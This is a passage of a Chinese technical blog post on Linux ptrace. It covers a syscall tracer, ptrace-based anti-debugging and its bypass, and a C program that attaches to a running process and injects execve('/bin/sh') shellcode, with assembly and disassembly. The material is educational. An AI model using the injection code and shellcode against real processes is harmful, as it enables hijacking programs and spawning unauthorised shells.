class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> child;</span><br><span class="line">    <span class="keyword">long</span> syscallID;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> calling = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    child = fork();</span><br><span class="line">    <span class="keyword">if</span>(child == <span class="number">0</span>) &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* tracee表明自己想要被追踪 */</span></span><br><span class="line">        execl(<span class="string">&quot;./HelloWorld&quot;</span>, <span class="string">&quot;HelloWorld&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            syscallID = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="number">0</span>); <span class="comment">/* 获取rax值从而判断将要执行的系统调用号 */</span></span><br><span class="line">            ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">            <span class="keyword">if</span>(calling == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call ID:%d\n&quot;</span>,syscallID);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SYS_call with rdi:0x%llx, rsi:0x%llx, rdx:0x%llx\n&quot;</span>,regs.rdi, regs.rsi, regs.rdx);</span><br><span class="line">                calling = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                calling = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* 在子进程进入和退出系统调用时都将其暂停 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>被测试的文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test               </span><br><span class="line">SYS_call ID:<span class="number">59</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x0</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x7f6f9d3ace2c</span>, rdx:<span class="number">0x4c</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3001</span>, rsi:<span class="number">0x7ffc51d572c0</span>, rdx:<span class="number">0x7f6f9d3a32d0</span></span><br><span class="line">SYS_call ID:<span class="number">21</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3af9e0</span>, rsi:<span class="number">0x4</span>, rdx:<span class="number">0x7f6f9d387270</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3acb80</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d564c0</span>, rdx:<span class="number">0x7ffc51d564c0</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">257</span></span><br><span class="line">SYS_call with rdi:<span class="number">0xffffff9c</span>, rsi:<span class="number">0x7f6f9d3b6f60</span>, rdx:<span class="number">0x80000</span></span><br><span class="line">SYS_call ID:<span class="number">0</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56668</span>, rdx:<span class="number">0x340</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56280</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56250</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56200</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56510</span>, rdx:<span class="number">0x7ffc51d56510</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x2000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d56160</span>, rdx:<span class="number">0x310</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e40</span>, rdx:<span class="number">0x20</span></span><br><span class="line">SYS_call ID:<span class="number">17</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x7ffc51d55e20</span>, rdx:<span class="number">0x44</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x1f1660</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d19f000</span>, rsi:<span class="number">0x178000</span>, rdx:<span class="number">0x5</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d317000</span>, rsi:<span class="number">0x4e000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x6000</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">9</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d36b000</span>, rsi:<span class="number">0x3660</span>, rdx:<span class="number">0x3</span></span><br><span class="line">SYS_call ID:<span class="number">3</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x3</span>, rsi:<span class="number">0x29</span>, rdx:<span class="number">0x0</span></span><br><span class="line">SYS_call ID:<span class="number">158</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1002</span>, rsi:<span class="number">0x7f6f9d370540</span>, rdx:<span class="number">0xffff809062c8f1a0</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d365000</span>, rsi:<span class="number">0x4000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d07f8000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">10</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d3b4000</span>, rsi:<span class="number">0x1000</span>, rdx:<span class="number">0x1</span></span><br><span class="line">SYS_call ID:<span class="number">11</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x7f6f9d371000</span>, rsi:<span class="number">0x152c8</span>, rdx:<span class="number">0xb9b00000000</span></span><br><span class="line">SYS_call ID:<span class="number">5</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x7ffc51d57120</span>, rdx:<span class="number">0x7ffc51d57120</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为tcache struct分配空间 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x0</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x2b0</span></span><br><span class="line">SYS_call ID:<span class="number">12</span> <span class="comment">/* 调用&quot;brk-12&quot;为标准输出分配缓存 */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x5574d1669000</span>, rsi:<span class="number">0x21000</span>, rdx:<span class="number">0x7f6f9d36c620</span></span><br><span class="line">Hello World!</span><br><span class="line">SYS_call ID:<span class="number">1</span> <span class="comment">/* 调用&quot;write-1&quot; */</span></span><br><span class="line">SYS_call with rdi:<span class="number">0x1</span>, rsi:<span class="number">0x5574d16482a0</span>, rdx:<span class="number">0xd</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以看见 tracee 从调用 <code>execve-59</code> 构建进程上下文到调用 <code>write-1</code> 的全过程</li>
+</ul>
+<p><strong>ptrace 的使用 - 反调试</strong></p>
+<p>ptrace 反调试的核心就在于主动执行 PTRACE_TRACEME：</p>
+<ul>
+<li>如果当前进程已经被追踪了，就不能被其他父进程追踪</li>
+<li>因此可以提前执行 PTRACE_TRACEME 命令来避免被 GDB 调试</li>
+</ul>
+<p>测试案例如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">	<span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) ==<span class="number">-1</span> )</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t trace me！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;no one trace me！\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常执行结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ./test</span><br><span class="line">no one trace me！</span><br></pre></td></tr></table></figure>
+<p>调试结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">don&#x27;t trace me！</span><br><span class="line">[Inferior 1 (process 4654) exited with code 01]</span><br></pre></td></tr></table></figure>
+<p>绕过的方式很简单，只要把相关的地方给 nop 掉就好：</p>
+<img src="/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/1667297539745.png" class width="1667297539745"> 
+<p>可以直接查看符号表来确定是否存在 prtace：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> objdump -t test | grep ptrace</span><br><span class="line"><span class="number">0000000000000000</span>       F *UND*	<span class="number">0000000000000000</span>              ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">➜  <span class="built_in">exp</span> readelf -s test | grep ptrace</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">2</span>)</span><br><span class="line">    <span class="number">60</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND ptrace@@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
+<p><strong>ptrace 的使用 - 代码注入</strong></p>
+<p>ptrace 可以对进程的追踪，并进行流程控制：</p>
+<ul>
+<li>用户寄存器值读取和写入操作</li>
+<li>内存进行读取和修改</li>
+</ul>
+<p>需要用到的 ptrace 命令如下：</p>
+<ul>
+<li>PTRACE_POKETEXT，PTRACE_POKEDATA：往内存地址中写入一个字节，内存地址由 addr 给出</li>
+<li>PTRACE_PEEKTEXT，PTRACE_PEEKDATA：从内存地址中读取一个字节，内存地址由 addr 给出 </li>
+<li>PTRACE_ATTACH：跟踪指定 pid 进程 </li>
+<li>PTRACE_GETREGS：读取所有寄存器的值 </li>
+<li>PTRACE_CONT：继续执行被跟踪的子进程，signal 为“0”则忽略引起调试进程中止的信号，若不为“0”则继续处理信号 signal </li>
+<li>PTRACE_SETREGS：设置寄存器</li>
+<li>PTRACE_DETACH：结束跟踪 </li>
+</ul>
+<p>下面程序用于在 tracee 中注入一段 shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace-abi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> word_size = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putdata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">size_t</span> addr, <span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">char</span> *code;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">u</span>&#123;</span></span><br><span class="line">        <span class="keyword">size_t</span> val;</span><br><span class="line">        <span class="keyword">char</span> word[word_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / word_size;</span><br><span class="line">    code = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, word_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">        ++i;</span><br><span class="line">        code += word_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % word_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.word, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, pid, addr + i * <span class="number">8</span>, data.val);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,ptrace(PTRACE_PEEKDATA, pid, addr + i * <span class="number">8</span>, <span class="literal">NULL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x52\x48\x89\xe6\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid,<span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 尝试连接目标进程 */</span></span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 获取tracee的寄存器 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;get target RIP: 0x%llx\n&quot;</span>,regs.rip);</span><br><span class="line">    putdata(pid,regs.rip,shellcode,<span class="built_in">strlen</span>(shellcode));</span><br><span class="line">    regs.rip += <span class="number">6</span>;</span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs); <span class="comment">/* 设置寄存器 */</span></span><br><span class="line">    ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 继续执行被跟踪的子进程 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This process is attacked by %s&quot;</span>,__FUNCTION__);</span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">/* 结束跟踪 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的 shellcode 就是 <code>execve(/bin/sh)</code>，汇编如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<ul>
+<li>进行编译：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  exp nasm -f elf64 sh.s -o sh.o</span><br><span class="line">➜  exp ld sh.o -o sh</span><br></pre></td></tr></table></figure>
+<ul>
+<li>显示二进制代码：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  exp objdump --disassemble ./sh</span><br><span class="line"></span><br><span class="line">./sh：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:	48 31 d2             	xor    %rdx,%rdx</span><br><span class="line">  401003:	52                   	push   %rdx</span><br><span class="line">  401004:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401007:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rax</span><br><span class="line">  40100e:	2f 73 68 </span><br><span class="line">  401011:	50                   	push   %rax</span><br><span class="line">  401012:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401015:	48 31 c0             	xor    %rax,%rax</span><br><span class="line">  401018:	b0 3b                	mov    $0x3b,%al</span><br><span class="line">  40101a:	0f 05                	syscall </span><br></pre></td></tr></table></figure>
+<p>测试文件如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;pid=%d\n&quot;</span>,getpid());</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> num=<span class="number">0</span>;num&lt;<span class="number">20</span>;num++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;num = %d\n&quot;</span>,num);</span><br><span class="line">		sleep(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/29/Tty_struct%20Attack+Modprobe_path%20Attack+Cred%20Attack/" rel="prev" title="Tty_struct Attack+Modprobe_path Attack+Cred Attack">
+      <i class="fa fa-chevron-left"></i> Tty_struct Attack+Modprobe_path Attack+Cred Attack
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">180</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">114</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
